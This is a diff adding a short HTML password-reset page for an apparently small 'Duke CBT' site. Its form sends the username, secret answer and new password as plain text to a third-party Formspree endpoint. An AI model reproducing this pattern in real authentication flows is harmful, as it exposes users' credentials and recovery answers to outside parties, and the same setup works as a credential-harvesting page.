@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Password Reset | Duke CBT</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="form-box">
+    <h2>Reset Password</h2>
+    <form action="https://formspree.io/f/xovldppr" method="POST">
+      <input type="text" name="username" placeholder="Your Username" required />
+      <input type="text" name="secret" placeholder="Your Secret Answer" required />
+      <input type="text" name="newpassword" placeholder="New Password" required />
+      <input type="hidden" name="_subject" value="Password Reset Request" />
+      <button type="submit">Reset</button>
+    </form>
+    <a class="whatsapp-help" href="login.html">Back to Login</a>
+  </div>
+</body>
+</html>
